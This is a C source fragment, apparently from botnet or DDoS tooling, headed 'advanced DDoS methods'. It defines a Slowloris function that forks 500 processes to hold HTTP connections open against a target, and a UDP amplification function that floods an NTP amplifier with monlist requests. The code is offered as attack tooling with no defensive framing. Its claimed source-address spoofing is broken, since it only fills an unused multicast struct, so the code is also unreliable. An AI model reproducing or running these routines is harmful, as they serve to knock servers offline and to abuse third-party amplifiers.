// 𝖠𝖣𝖵𝖠𝖭𝖢𝖤𝖣 𝖣𝖣𝖮𝖲 𝖬𝖤𝖳𝖧𝖮𝖣𝖲
void send_slowloris(char *host, int port, int timeEnd) {
    int sock, i;
    char request[512];
    
    for(i = 0; i < 500; i++) { // 500 𝖼𝗈𝗇𝗇𝖾𝖼𝗍𝗂𝗈𝗇𝗌
        if(fork() == 0) {
            time_t start = time(NULL);
            while(time(NULL) < start + timeEnd) {
                sock = socket_connect(host, port);
                if(sock > 0) {
                    sprintf(request, "GET / HTTP/1.1\r\nHost: %s\r\n", host);
                    send(sock, request, strlen(request), MSG_NOSIGNAL);
                    // 𝖪𝖾𝖾𝗉 𝖼𝗈𝗇𝗇𝖾𝖼𝗍𝗂𝗈𝗇 𝗈𝗉𝖾𝗇
                    sleep(timeEnd);
                }
                close(sock);
            }
            _exit(0);
        }
    }
}

void send_udp_amplification(char *target, int port, char *amplifier_ip, int amplifier_port, int timeEnd) {
    // 𝖴𝖣𝖯 𝖺𝗆𝗉𝗅𝗂𝖿𝗂𝖼𝖺𝗍𝗂𝗈𝗇 𝖺𝗍𝗍𝖺𝖼𝗄 (𝖭𝖳𝖯, 𝖣𝖭𝖲, 𝖲𝖲𝖣𝖯)
    char amplification_payload[] = 
        "\x17\x00\x03\x2a" // 𝖭𝖳𝖯 𝗆𝗈𝗇𝗅𝗂𝗌𝗍 𝗋𝖾𝗊𝗎𝖾𝗌𝗍
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    
    struct sockaddr_in amp_addr, target_addr;
    amp_addr.sin_family = AF_INET;
    amp_addr.sin_port = htons(amplifier_port);
    amp_addr.sin_addr.s_addr = inet_addr(amplifier_ip);
    
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    target_addr.sin_addr.s_addr = inet_addr(target);
    
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sock < 0) return;
    
    // 𝖲𝗉𝗈𝗈𝖿 𝗌𝗈𝗎𝗋𝖼𝖾 𝖺𝖽𝖽𝗋𝖾𝗌𝗌 𝗍𝗈 𝗍𝖺𝗋𝗀𝖾𝗍
    struct ip_mreq mreq;
    mreq.imr_multiaddr.s_addr = target_addr.sin_addr.s_addr;
    mreq.imr_interface.s_addr = htonl(INADDR_ANY);
    
    time_t start = time(NULL);
    while(time(NULL) < start + timeEnd) {
        sendto(sock, amplification_payload, sizeof(amplification_payload), 0,
               (struct sockaddr*)&amp_addr, sizeof(amp_addr));
        usleep(10000); // 10𝗆𝗌
    }
    close(sock);
}